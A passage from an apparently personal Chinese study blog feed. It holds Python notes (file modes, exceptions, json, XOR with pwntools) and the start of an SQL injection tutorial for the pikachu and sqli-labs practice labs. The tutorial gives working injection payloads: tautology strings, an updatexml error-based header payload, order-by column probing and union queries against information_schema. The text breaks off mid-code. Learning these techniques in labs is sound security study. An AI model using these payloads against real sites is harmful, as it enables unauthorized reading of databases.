start="11"><li>如果直接是两行.write()代码，是无法换行的，和print不同，我们需要加换行符才能使输入的内容换行</li><li>如果想要在原来的文本的基础上加入内容：<code>with open(&#39;····&#39;,mode=&#39;a&#39;) as 变量1:</code></li><li><code>&#39;rb+&#39;</code>代替<code>&#39;w&#39;</code>，可以用于读取二进制文件。</li><li><code>&#39;w&#39;</code>模式：表示写入模式，如果文件存在会被覆盖。如果文件不存在，创建新文件。这种模式下，你正在处理文本数据，即你写入的内容会被视为字符串。<code>&#39;wb&#39;</code>模式：表示二进制写入模式。这种模式下，你正在处理二进制数据，比如图片、视频等。这时候，你写入的应该是字节（bytes）类型的数据，而不是字符串。总结来说，<code>&#39;w&#39;</code>与<code>&#39;wb&#39;</code>的主要区别在于，<code>&#39;w&#39;</code>用于写入文本（字符串），而<code>&#39;wb&#39;</code>用于写入二进制数据。</li><li>过大的文件读取后无法完整的打印在控制台上</li></ol><h1 id="try语句"><a href="#try语句" class="headerlink" title="try语句"></a>try语句</h1><ol><li>try-except语句：先执行try语句下面的代码块，如果不报错，就忽视except下的代码块的语句，如果报错，判断和except语句中的异常名是否一致，如果一致，则执行except下的代码块：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    ····（代码块）    #print(5/0) 报错如下：</span><br><span class="line">except  异常名：     # ZeroDivisionError: division by zero,异常名是ZeroDivisionError</span><br><span class="line">    ····（代码块）</span><br></pre></td></tr></table></figure><pre><code> 其中的异常不包括语句的基本错误。一个try后面可以跟无数个except。</code></pre><ol start="2"><li>try-except-else，else在最后一个except后面，和except并列，当try语句执行完，没有异常时，执行else下面的代码模块（我觉得没有什么用，直接把else模块的代码放在try的模块中不就一样了）</li><li>try-···-finally,try语句后面还可以和finally并列，不管try中的模块是否又异常，finally中的模块都要执行。try语句后面必须又except或者finally。try语句中即使出现异常，finally中的语句仍然会执行除非有基本的语句错误（我也觉得finally没多大用）</li></ol><h1 id="pass语句"><a href="#pass语句" class="headerlink" title="pass语句"></a>pass语句</h1><ol><li>pass是空语句，什么都不做。pass不做任何事情，表示一个占位符，一般用作占位语句。能够保证程序的代码结构正确。</li></ol><h1 id="json模块"><a href="#json模块" class="headerlink" title="json模块"></a>json模块</h1><ol><li>json.dump()将数据储存进json文件中：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;文件名.json&#x27;，&#x27;w&#x27;) as 变量1：</span><br><span class="line">     json.dump(变量2，变量1)   #将变量2的内容赋给变量1，再储存进文件中。</span><br></pre></td></tr></table></figure><ol start="2"><li>json.load()将json文件中的数据读取出来：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;文件名.json&#x27;) as 变量1：</span><br><span class="line">     变量2=json.load(变量1)    #读取出来的数据储存在变量2中</span><br></pre></td></tr></table></figure><ol start="3"><li>json支持数组、对象、字符串、数字、布尔型、NULL值</li><li>json.load从文件中加载数据，而json.loads从字符串中加载数据。另外，json.load返回一个Python对象，而json.loads返回一个Python字典（如果JSON字符串是一个对象）或一个Python列表（如果JSON字符串是 一个数组）。</li></ol><h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><ol><li>因为中文报错：SyntaxError: Non-UTF-8 code starting with ‘\xba’ in file。在代码首行加: # coding:utf-8  即可（一定在首行加）</li><li>因为Python在Windows中打印文本时默认使用GBK编码，但是网络上的数据大都是UTF-8编码，特殊字符GBK无法解码就会报错:UnicodeEncodeError: ‘gbk’ codec can’t encode character ‘\xee’ in position 20266: illegal multibyte sequence。解决方法（添加下面代码）：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import io</span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">#但要注意，有些时候输出的都为正常的utf-8（没有特殊字符）的时候，不需要加上面</span><br><span class="line">的几行代码，加了反而会输出乱码，这个时候删除sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">即可。所以最好一般不要加这个代码，除非出现报错SyntaxError……才加</span><br></pre></td></tr></table></figure><h1 id="对python结果进行搜索"><a href="#对python结果进行搜索" class="headerlink" title="对python结果进行搜索"></a>对python结果进行搜索</h1><ol><li>ctrl+f，在搜索框输入搜索内容即可（其他很多软件、浏览器中是ctrl+g用来搜索内容）</li></ol><h1 id="左移和右移操作"><a href="#左移和右移操作" class="headerlink" title="左移和右移操作"></a>左移和右移操作</h1><ol><li>左移<ol><li>左移操作在二进制层面上相当于乘以2的某个幂。当你将一个数字的二进制表示向左移动时，你实际上是在增加它的位级表示中的位置，这相当于将该数字乘以2的移位数的次方。</li><li>例如，如果有一个数字x，并且你执行x &lt;&lt; 1（即左移一位），这相当于x * 2。如果你执行x &lt;&lt; 2，这相当于x * 4，依此类推。</li><li>左移操作比乘法运算快得多，因为它可以直接在硬件级别上执行。左移操作也不会遇到乘法可能导致的溢出问题，因为结果总是简单地扩展了数字的二进制表示。（需要注意的是，左移操作可能会导致结果超出原始数据类型能够表示的范围。）</li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = 1  # 二进制表示为 0001  </span><br><span class="line">y = x &lt;&lt; 3  # y 的值是 8，二进制表示为 1000</span><br></pre></td></tr></table></figure><ol start="2"><li>右移<ol><li>右移操作在二进制层面上相当于除以2的某个幂。当你将一个数字的二进制表示向右移动时，你实际上是在减少它的位级表示中的位置，这相当于将该数字除以2的移位数的次方。</li><li>例如，如果有一个数字x，并且你执行x &gt;&gt; 1（即右移一位），这相当于x &#x2F; 2（忽略余数）。如果你执行x &gt;&gt; 2，这相当于x &#x2F; 4，依此类推。</li><li>注意：<ol><li><strong>舍入</strong>：在实际的除法运算中，你可能会得到一个带有小数的结果，而在右移操作中，结果总是向下取整。</li><li><strong>符号</strong>：对于负数，右移的行为可能会因编程语言和平台的不同而有所不同。在某些情况下，右移负数可能会导致算术右移（保持符号位不变），而在其他情况下可能会导致逻辑右移（不考虑符号位）。</li><li><strong>溢出</strong>：如果右移的位数超过了数字的位数，结果通常是未定义的。例如，在一个8位字节中右移9位是没有意义的。</li><li><strong>性能</strong>：在计算机硬件中，移位操作通常比除法运算要快得多，因为它们可以直接在硬件级别上执行。</li></ol></li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = 8  # 二进制表示为 1000  </span><br><span class="line">y = x &gt;&gt; 1  # y 的值是 4，二进制表示为 0100</span><br></pre></td></tr></table></figure><h1 id="异或运算："><a href="#异或运算：" class="headerlink" title="异或运算："></a>异或运算：</h1><ol><li>a，b不同，异或结果为1；a，b相同，异或结果为0。python的异或运算符：^</li><li>一般是将两个数的值转化为二进制，再进行异或运算，最后得到的值就是异或运算的结果的二进制形式。      </li><li>异或运算的性质：a异或b&#x3D;c，则a异或c&#x3D;b；b异或c&#x3D;a</li><li>^异或时不会自动补全，低位异或，高位不变。如：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="string">b&#x27;ab&#x27;</span></span><br><span class="line">n2 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">c = bytes_to_long(n1) ^ bytes_to_long(n2)</span><br><span class="line"><span class="built_in">print</span>((long_to_bytes(c))[:<span class="number">1</span>])</span><br><span class="line"><span class="comment"># b&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">print</span>((long_to_bytes(c))[<span class="number">1</span>:])</span><br><span class="line"><span class="comment"># b&#x27;\x03&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(bytes_to_long(<span class="string">b&#x27;a&#x27;</span>) ^ bytes_to_long(<span class="string">b&#x27;b&#x27;</span>)))</span><br><span class="line"><span class="comment"># b&#x27;\x03&#x27;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在两个长度不同的字节串进行异或运算的时候，可以通过重复短的字节串自身来填充短的字节串，直到长度与长字节串一致。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#len(a)&gt;len(key)</span></span><br><span class="line">complete_key = (key * (<span class="built_in">len</span>(a)//<span class="built_in">len</span>(key)+<span class="number">1</span>))[:<span class="built_in">len</span>(a)]</span><br><span class="line"><span class="comment">#[:len(a)],将长度限制在len(a)</span></span><br></pre></td></tr></table></figure><ol start="6"><li>xor函数能自动补全短字节的字节串，原理同 5 。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&#x27;</span></span><br><span class="line">a = <span class="built_in">bytes</span>.fromhex(a)</span><br><span class="line">key = <span class="string">b&#x27;myXORkey&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(xor(a,key))</span><br></pre></td></tr></table></figure><h1 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h1><ol><li>清华大学：<a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a> </li><li>阿里云：<a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a> </li><li>豆瓣：<a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a> </li><li>中国科学技术大学：<a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2025/03/01/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/03/01/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>所有注入语句等都默认是mysql的数据库、源码是php文件，除非特殊提出是其他数据库 </p><p><a href="https://blog.csdn.net/lady_killer9/article/details/107300079">网络安全-SQL注入原理、攻击及防御-CSDN博客</a></p><h1 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h1><ol><li>当通过phpstudy启动mysql后自动关闭，是因为本机原本下载的mysql在c盘，启动优先级更高，最先启动。所以解决这个问题的办法是：搜索服务，将服务中的mysql关闭后再启动即可</li><li>搭建pikachu靶场：<a href="https://blog.csdn.net/Elite__zhb/article/details/131680435">pikachu靶场搭建教程(官方版）-CSDN博客</a></li><li>搭建sql-labs靶场：<a href="https://blog.csdn.net/2302_82189125/article/details/136015200">如何搭建 SQLi-Labs 靶场保姆级教程（附链接）_sqlilabs靶场搭建-CSDN博客</a></li></ol><h1 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h1><p><img src="/../%E5%9B%BE%E7%89%87/sql%E6%B3%A8%E5%85%A5.assets/image-20240714161715305-1721657804095-7.png" alt="image.png"><img src="/../%E5%9B%BE%E7%89%87/sql%E6%B3%A8%E5%85%A5.assets/image-20240714161737916-1721657807036-9.png" alt="image-20240714161737916"></p><h1 id="mySQL基础语法"><a href="#mySQL基础语法" class="headerlink" title="mySQL基础语法"></a>mySQL基础语法</h1>  <img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/D:../图片/SQL注入.assets/image-20240714161828449.png" alt="image-20240714161828449" style="zoom:80%;"><ol><li>mysql中16进制的语句是可以执行的，即将sql语句转为16进制，发送16进制数据，mysql可以执行这条16进制格式的sql语句</li></ol><h2 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h2><p><a href="https://blog.csdn.net/PILIpilipala/article/details/113798383">史上最全SQL基础知识总结(理论+举例)_sql学习-CSDN博客</a><br><a href="https://blog.csdn.net/Python84310366/article/details/131557987">SQL入门教程（非常详细）从零基础入门到精通，看完这一篇就够了-CSDN博客</a></p><ol><li>查看当前数据库登录用户<code>user()</code>：<code>select user()</code>(注入查询出的<code>user()</code>即是当前后台发给数据库请求的用户，要满足要求的用户数据库才会返回信息)</li><li>查看当前数据库是什么<code>database()</code>：<code>select database()</code></li><li>查看当前版本<code>version()</code>：<code>select version()</code></li><li>拼接两个或多个字符串<code>concat()</code>：<code>concat(string1, string2, ..., stringN)</code></li></ol><h2 id="mysql数据结构"><a href="#mysql数据结构" class="headerlink" title="mysql数据结构"></a>mysql数据结构</h2><ol><li>mysql数据库5.0以上版本有一个自带的数据库叫做information_schema，该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。</li></ol><h1 id="SOL注入原理及漏洞利用"><a href="#SOL注入原理及漏洞利用" class="headerlink" title="SOL注入原理及漏洞利用"></a>SOL注入原理及漏洞利用</h1><ol><li>服务端没有过滤用户输入的恶意数据，直接把用户输入的数据当作SQL语句执行，从而影响数据库按弃权和平台安全</li><li>有数据交互的地方就容易产生注入点</li><li>sql注入的核心：将用户输入的数据拼接到代码中，并被当成 sql 语句执行</li></ol><h1 id="SQL注入方法："><a href="#SQL注入方法：" class="headerlink" title="SQL注入方法："></a>SQL注入方法：</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><ol><li>注入流程：                                                                                                                <img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/D:../图片/SQL注入.assets/image-20240714162044244.png" alt="image-20240714162044244" style="zoom:67%;"></li><li>注入方法：                                                                                                                 <img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/D:../图片/SQL注入.assets/image-20240714162111520.png" alt="image-20240714162111520" style="zoom: 67%;"><br><a name="RHmIQ"></a></li></ol><h2 id="如何查找注入点位置"><a href="#如何查找注入点位置" class="headerlink" title="如何查找注入点位置"></a>如何查找注入点位置</h2><ol><li>前端页面所有提交数据的地方，不管是登录、注册、留言板、评论区等地方，只要提交数据给后台，后台用该数据和数据库交互了，那么这个地方就可能存在注入点。还有一些不明显的注入点则需要通过转包等方式进行查找</li><li>在调整注入点或注入内容时，一般都是通过burpsuit抓包后进行尝试</li></ol><h1 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h1><h2 id="数据型分类"><a href="#数据型分类" class="headerlink" title="数据型分类"></a>数据型分类</h2><p>主要分为数字型、字符型、搜索型、xx型（面试常问）</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><ol><li>注入点原本输入内容是字符串，注入时需要加引号作为闭合符。原始代码：<code>$query = &quot;select id, email from member where username=&#39;$name&#39;&quot;;</code></li><li>注入语句（payload）：<code>d&#39; or 1=1#</code></li><li>检测应用程序是否将用户输入直接插入到后台数据库执行的SQL语句中。如果是，在输入<code>d&#39; or 1=1#</code>（默认在该数据库中是用<code>&#39;</code>作为字符串的闭合符）后则会返回所有信息，可以以此判断该输入点（注入点）对应的数据库内容。否则报错。<ol><li>如果是直接插入。<ol><li>假设是输入用户名的情况，<code>$name</code>即输入的用户名</li><li>数据库中的SQL代码语句是<code>$query = &quot;select id, email from member where username=&#39;$name&#39;&quot;;</code> 其中<code>$query</code>存储的是即将发送到服务器的命令</li><li>我们输入的内容会替换掉<code>$name</code>，因此会得到命令<code>……where username=&#39;d&#39; or 1=1#&#39;</code></li><li>因为1&#x3D;1是永真式，所以在执行这条命令时，和每个用户名匹配都为真，所以会输出所有用户信息</li><li>备注：代码在将这条命令发送到服务端时，服务端会自动为这条命令加上<code>;</code></li></ol></li><li>如果不是直接输入，有防范措施，如转码之类的，就会报错误</li></ol></li><li>引号测试（只有字符型注入需要加引号闭合，即注入点是输入字符串，所有数据库通用）：<ol><li>单引号闭合数据：随便输入一个单词，在后面加 <strong>‘</strong> 或 <strong>“</strong> ，报错就可以判断有注入点，单引号报错，双引号无输出则闭合符是单引号。eg: 输入<code>vince&#39;</code> 和 <code>vince&quot;</code>，<code>select id, email from member where username=&#39;vince&#39;&#39;</code>和<code>……username=&#39;vince&quot;&#39;</code>，第一个报错，多了一个单引号；第二个正常，但无输出，因为查找的是名为<code>vince&quot;</code>的内容。</li><li>双引号闭合数据：随便输入一个单词，在后面加 <strong>‘</strong> 或 <strong>“</strong> ，报错就可以判断有注入点，双引号报错，单引号无输出则闭合符是双引号。eg: 输入<code>vince&#39;</code> 和 <code>vince&quot;</code>，<code>select id, email from member where username=&quot;vince&#39;&quot;</code>和<code>……username=&quot;vince&quot;&quot;</code>，第一个正常，但无输出，因为查找的是名为<code>vince&#39;</code>的内容；第二个报错，多了一个双引号。</li></ol></li></ol><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><ol><li>注入点的原本输入内容是数字，注入时不需要加引号作为闭合符，原始代码：<code>$query = &quot;select username, email from member where id=$id;</code></li><li>注入语句（所有数据库通用）：<ol><li>测试语句，是否为注入点（是否有防护，参数化处理，PDO预处理）：<code>1 and 1=1#</code>，<code>1 and 1=2#</code></li><li>若无防护，注入语句（payload）：<code>1 or 1=1#</code></li></ol></li><li>测试原理，当有防护（参数化处理），输入<code>1 and 1=1#</code>和<code>1 and 1=2#</code>时，应当无输出，因为它分别将这两条语句的整体当作一个参数来输入了，即寻找有无<strong>id</strong>是’1 and 1&#x3D;1’或’1 and 1&#x3D;2’的；当无防护时，应当在输入<code>1 and 1=1</code>时有输出，在输入<code>1 and 1=2</code>时无输出。</li><li>注入原理，和字符型注入类似，通过<code>or 1=1</code>达到永真式<code>select username, email from member where id=1 or 1=1</code>，以此输出所有信息</li></ol><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><ol><li>搜索时基本都是使用模糊搜索，在SQL中模糊搜索(关键字<code>like</code>)是：<ol><li><code>select id, email from member where username like &#39;%vin%&#39;;</code></li><li><code>%</code>是通配符，就是可以代替所有字符</li><li>在这行代码中的意思是查询出所有包含了’vin’的username对应的id和email，eg：kvin或avinb或vince</li></ol></li><li>注入点的原本输入是字符串（有很小可能是数字），注入时需要加引号闭合，原始代码：<code>select id, email from member where username like &#39;%$name%&#39;;</code></li><li>注入语句（payload）：<code>d%&#39; or 1=1#</code>（引号前加**%<strong>以闭合源码中的</strong>%**。在联合（union）注入或其他情况下（<code>d%&#39; union ……#</code>），这样得到注入结果更多，所以最好加上这个。d可以换成其他字符，这个是按情况选择最佳，甚至可以写成<code>%d%&#39; union ……#</code>以匹配更多）</li><li>注入原理：注入成功后是：<code>select id, email from member where username like &#39;%d%&#39; or 1=1#%&#39;;</code>其思想和字符型注入类似</li></ol><h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><ol><li>注入点的原本输入是字符串（有很小可能是数字），注入时需要加引号闭合并且外面多了一个<strong>括号</strong>需要闭合。源码：<code>$query = &quot;select id, email from member where username=(&#39;$name&#39;)&quot;;</code></li><li>注入语句（payload）：<code>d&#39;) or 1=1#</code></li><li>注入原理：<code>select id, email from member where username=(&#39;d&#39;) or 1=1#&#39;);</code></li></ol><h3 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h3><ol><li><p>json类型：浏览器中发送请求有几种格式（content-type），默认的是urlencoded，json格式是其中之一。跨语言交互一般都使用的是json格式</p></li><li><p>和字符型注入和数字型注入类似，在注入前，先判断json数据的原始语句中键值是字符型还是数字型、字符型，在字符型则使用字符型的注入语句，否则，使用数字型的注入语句。</p></li><li><p>原始语句：                                                                                                                                                                                                                                                   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">json1 = &#123;&quot;username&quot;:&quot;peter&quot;, &quot;id&quot;:1&#125;;</span><br><span class="line">……</span><br><span class="line">$query1 = &quot;select id, email from member where username=&#x27;$name&#x27;&quot;;</span><br><span class="line">$query2 = &quot;select username, email from member where id=$id&quot;;</span><br><span class="line">//经过转码赋值等一系列操作后，会将username对应的键值赋值给$name,会将id对应的键值赋值给$id</span><br></pre></td></tr></table></figure></li><li><p>注入语句（payload）：</p><ol><li>字符型：<code>peter&#39; or 1=1#</code>，即<code>&quot;peter&#39; or 1=1#&quot;</code></li><li>数字型： <code>or 1=1#</code>，即<code>1 or 1=1#</code></li></ol></li><li><p>注入原理：</p><ol><li><code>select id, email from member where username=&#39;peter&#39; or 1=1#&#39;</code></li><li><code>select username, email from member where id=1 or 1=1</code></li></ol></li></ol><h2 id="提交方式分类"><a href="#提交方式分类" class="headerlink" title="提交方式分类"></a>提交方式分类</h2><p>注入提交方式的分类主要是根据后台代码处理网页端请求方法的方式来分类的</p><blockquote><p>ASP、PHP和Python的脚本都能用于接收网页端的请求和调用数据库以及发送命令。这些脚本语言都提供了丰富的库和接口，使得它们能够轻松地与数据库进行交互，并执行各种命令。后台代码的作用就是接受网页端发来的请求（各种数据），处理后发送命令给数据库，得到数据库的响应再返回给网页端。</p><p>ASP：<code>request</code>（全部接受）、<code>request.querystring</code>（接受get）、<code>request.from</code>（接受post）、<code>request.cookie cookie</code> （接受cookie）</p><p><strong>PHP</strong>：<code>$_REQUEST</code>（全部接受，cookie内的一般不行，因为get、post都能接受，增加了注入点，所以这种方式被攻击的危险性更大，不建议使用）、<code>$_GET</code>（不是取get请求携带的数据，而是取得查询参数数据，所以post请求（前提是在url上）它也能取，只要是url上查询参数的数据都可以取）、<code>$_POST</code>（接受post）、<code>$_COOKIE</code>（接受cookie）</p><p>其他语言，看开发框架，不同框架，提取http请求数据的写法或者说函数不同</p><p>python django  – mvc –  <code>request.GET</code>、<code>request.POST</code>、<code>request.body</code></p></blockquote><h3 id="get提交方式"><a href="#get提交方式" class="headerlink" title="get提交方式"></a>get提交方式</h3><p><img src="/../%E5%9B%BE%E7%89%87/sql%E6%B3%A8%E5%85%A5.assets/image-20240716165544443-1721657714032-1.png" alt="image-20240716165544443"></p><p><img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/../../../1-笔记/图片/SQL注入.assets/image-20240716165349264.png" alt="image-20240716165349264" style="zoom: 59%;"><img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/../图片/sql注入.assets/image-20240716165908930.png" alt="image-20240716165908930" style="zoom:59%;"></p><h3 id="post提交方式"><a href="#post提交方式" class="headerlink" title="post提交方式"></a>post提交方式</h3><p><img src="/../%E5%9B%BE%E7%89%87/sql%E6%B3%A8%E5%85%A5.assets/image-20240716165813685-1721657723934-3.png" alt="image-20240716165813685"><img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/../../../1-笔记/图片/SQL注入.assets/image-20240716170412867.png" alt="image-20240716170412867" style="zoom:80%;"></p><p><code>$_POST</code>要能读取post请求，post请求中参数必须单独放置（在请求体中），并且要增加Content-Type</p><h3 id="cookie提交方式"><a href="#cookie提交方式" class="headerlink" title="cookie提交方式"></a>cookie提交方式</h3><img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/../图片/sql注入.assets/image-20240716170828287.png" alt="image-20240716170828287" style="zoom:67%;"><img src="/2025/03/01/sql%E6%B3%A8%E5%85%A5/../图片/sql注入.assets/image-20240716171002416.png" alt="image-20240716171002416" style="zoom:67%;"><p>因为代码限制了，只返回id并没有返回查询到的数据，即没有回显。此时还可以通过联合查询（<code>union</code>）进行报错注入，查询版本信息等</p><h2 id="请求数据位置分类"><a href="#请求数据位置分类" class="headerlink" title="请求数据位置分类"></a>请求数据位置分类</h2><h3 id="Http-Header-注入"><a href="#Http-Header-注入" class="headerlink" title="Http Header 注入"></a>Http Header 注入</h3><ol><li>对请求头进行注入，如报错注入：在User-Agent输入payload<code>Mozilla&#39; or updatexm1(1,concat(0x7e,database()),0) or</code>，因为有些企业把user-agent等请求头键值对的数据也保存在了数据库里面</li><li>php专门取请求头数据的，使用的方法是<code>$SEVER[&#39;请求头键&#39;]$</code>就能拿到值</li></ol><h2 id="注入查询语句分类"><a href="#注入查询语句分类" class="headerlink" title="注入查询语句分类"></a>注入查询语句分类</h2><ol><li><p><code>insert</code>、<code>delete</code>、<code>update</code>、<code>select</code>也就是增删改查。这些命令都可以被sql注入，其中面对<code>insert</code>、<code>delete</code>、<code>update</code>命令（增删改）一般是使用报错注入</p></li><li><p><code>insert</code>注入：后台源码是<code>insert</code>命令语句时，eg：一般用于前端操作是注册账户、提交信息等。这种操作一般是没有回显的，所以可以使用报错注入</p></li><li><p><code>update</code>注入：后台源码是<code>update</code>命令语句时，eg：一般用于用户登录端（修改最后一次登陆时间、信息等）或修改数据的地方等。这种操作一般是没有回显的，所以可以使用报错注入</p></li><li><p><code>delete</code>注入：后台源码是<code>delete</code>命令语句时，eg：一般用于前后端发帖、留言、用户等相关的删除操作等。这种操作一般是没有回显的，所以可以使用报错注入（但一般要管理员才有权限进行这些操作）</p></li></ol><h1 id="union注入攻击"><a href="#union注入攻击" class="headerlink" title="union注入攻击"></a>union注入攻击</h1><h2 id="union查询（联合查询，所有关系型数据库通用）"><a href="#union查询（联合查询，所有关系型数据库通用）" class="headerlink" title="union查询（联合查询，所有关系型数据库通用）"></a>union查询（联合查询，所有关系型数据库通用）</h2><ol><li><code>union</code> 查询在 SQL 中是一种将两个或多个 <code>select</code> 语句的结果集合并为一个结果集的操作。使用 <code>union</code> 时，每个 SELECT 语句必须拥有相同数量的列(字段)，并且每列(字段)的数据类型也需要兼容（因为这条命令的作用是将不同表的数据汇聚到同一个表中，每一列(字段)装了不同<code>select</code>语句提取的内容）。<code>union</code> 默认会去除重复的记录，如果你希望包含重复的记录，可以使用 <code>union all</code>。</li><li>基本语句：<code>select column_name1，column_name2 from table1 union select column_name3，column_name4 from table2;</code>（将<code>column_name1</code>和<code>column_name3</code>的内容装在同一列，将<code>column_name2</code>和<code>column_name4</code>的内容装在同一列, <code>table1</code>可以为空）</li><li>注意事项<ol><li>列的数量和数据类型：所有 <code>select</code> 语句中的列数必须相同，且对应列的数据类型也必须兼容（或可以隐式转换）。</li><li>默认去重：<code>union</code> 默认会去除结果集中的重复行，如果你想要包含所有行（包括重复行），则应该使用 <code>union all</code>。</li></ol></li><li>注释符号和加号：<ol><li>在get请求中没有空格，空格都是用**+**表示（即在url中）。post请求可以出现空格</li><li>SQL中注释符号**#<strong>、</strong>–<strong>。</strong>#<strong>注释可以直接接后面命令，</strong>–**必须要有空格才能跟后面的命令。eg:  <code>select column_name1 from table1 union select column_name2 from table2;</code> -&gt; <code>select column_name1 from table1; #union select column_name2 from table2;</code>  &lt;&#x3D;&gt;  <code>select column_name1 from table1; -- union select column_name2 from table2;</code></li><li>在get请求中不能出现**#<strong>，可以用</strong>#<strong>的url编码来代替作为注释；也可以用</strong>–<strong>来注释，记得后面要跟一个空格，但是因为get请求中不能出现空格，所以要用</strong>+**或空格的url编码代替</li></ol></li></ol><h2 id="union注入流程"><a href="#union注入流程" class="headerlink" title="union注入流程"></a>union注入流程</h2><h3 id="字段判断"><a href="#字段判断" class="headerlink" title="字段判断"></a>字段判断</h3><ol><li>通过尝试得到数据库查询可以返回的字段数量。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line"></span><br><span class="line">1&#x27; order by 2#</span><br><span class="line"></span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">……</span><br><span class="line">一直尝试，直到语句报错，则上一个数字是可以返回的字段数量</span><br><span class="line">order by n：根据第n列进行排序</span><br></pre></td></tr></table></figure><h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><ol><li>查询当前数据库名，用database()函数即可（假设字段数为2）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27; UNION SELECT 1,database() from information_schema.schemata#</span><br></pre></td></tr></table></figure><ol start="2"><li>查询所有数据库名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27; UNION SELECT 1,group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><ol><li>假设数据库名pikachu，获取所有表名</li></ol><figure class="highlight 